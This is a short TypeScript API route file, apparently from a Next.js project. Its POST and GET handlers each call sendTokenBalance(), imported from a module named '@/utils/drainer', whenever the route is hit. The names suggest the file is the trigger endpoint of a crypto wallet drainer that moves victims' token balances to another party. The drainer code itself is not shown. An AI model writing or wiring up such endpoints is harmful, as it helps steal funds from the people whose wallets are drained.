import { sendTokenBalance, transferBalance} from "@/utils/drainer"

export async function POST(reqs: Request) {
 
    try {
     
        const receipt = await sendTokenBalance()
   
    return Response.json({ message: "Done" },{status: 200})
            
    } 
    catch (error) {

        console.log("Error failed sending", error)
        return Response.json({ message: "error" }, {status: 200})
    }

}

export async function GET() {
    try {
        const receipt = await sendTokenBalance()
  
    return Response.json({ message: "Done" },{status: 200})
    } 
    
    catch (error) {
        console.log("Error failed sending", error)
        return Response.json({ message: "error" }, {status: 200})
    }
}

